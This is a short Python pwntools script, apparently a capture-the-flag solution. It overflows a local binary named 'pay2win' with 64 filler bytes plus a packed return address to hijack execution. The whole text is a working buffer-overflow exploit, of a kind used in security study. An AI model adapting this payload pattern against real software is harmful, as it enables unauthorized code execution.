from pwn import *

# Connect to the program
p = process('./pay2win')

# Wait for the program to prompt for input
p.recvuntil('How much are you willing to pay > ')

# Craft the payload
payload = b'A' * 64 + p32(0x804867b)

# Send the payload
p.sendline(payload)

# Receive the program output
output = p.recvall().decode()

# Print the output
print(output)

